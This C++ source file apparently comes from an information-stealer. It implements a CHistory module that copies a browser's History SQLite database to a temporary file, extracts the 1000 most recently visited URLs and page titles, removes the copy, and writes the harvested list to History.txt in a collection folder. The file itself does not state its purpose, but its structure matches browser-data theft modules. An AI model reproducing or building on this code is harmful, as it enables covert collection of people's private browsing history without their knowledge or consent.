//
// Created by .1qxz on 08.06.2024.
//

#include "CHistory.h"

void CHistory::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "History";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<History> history = CHistory::getHistory(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(History &row : history)
        row.write(ss);

    Utils::writeFile(root / "History.txt", ss.str(), true);
}

std::list<History> CHistory::getHistory(const fs::path &db_path) {
    std::list<History> history;

    SQLiteUtil::connectAndRead("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 0, 1000", db_path, [&history](sqlite3_stmt *stmt) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* title = sqlite3_column_text(stmt, 1);

        History historyRecord;
        historyRecord.url = std::string(reinterpret_cast<const char*>(url));
        historyRecord.title = std::string(reinterpret_cast<const char*>(title));

        history.push_back(historyRecord);
    });

    return history;
}
